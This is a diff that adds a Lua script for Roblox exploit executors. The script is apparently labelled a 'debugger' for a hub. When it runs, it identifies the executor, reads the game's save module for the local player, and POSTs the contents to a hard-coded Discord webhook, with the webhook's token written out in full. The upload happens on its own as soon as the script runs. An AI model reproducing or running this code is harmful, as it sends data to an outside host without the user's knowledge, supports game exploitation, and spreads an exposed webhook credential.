@@ -1,0 +1,37 @@
+local function webhook(Message)
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+
+    local url = "https://discord.com/api/webhooks/1189288360007696414/NM9Lu1O4Jv4ffnpBKKx_7ZALf__OILWxq255-FWRQ0iL0nzRU6dEoP6L0Uu87SHwi7Ut"  -- Substitua com seu URL de webhook
+    local data = {
+        ["content"] = "Depurador LDS HUB!\n\n"
+    }
+
+    local savemodule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local SaveFile = savemodule.Get(game.Players.LocalPlayer)
+
+    -- Iterar sobre as chaves em savemodule
+    for key, value in pairs(savemodule) do
+        if key ~= "UnlockedZones" then
+            -- Adicionar informações ao conteúdo da mensagem
+            data["content"] = data["content"] ..
+                "📁 ** | " .. key .. " **\n📃 ** L** " .. value .. "\n\n"
+        end
+    end
+
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Chamar a função do webhook
+webhook()
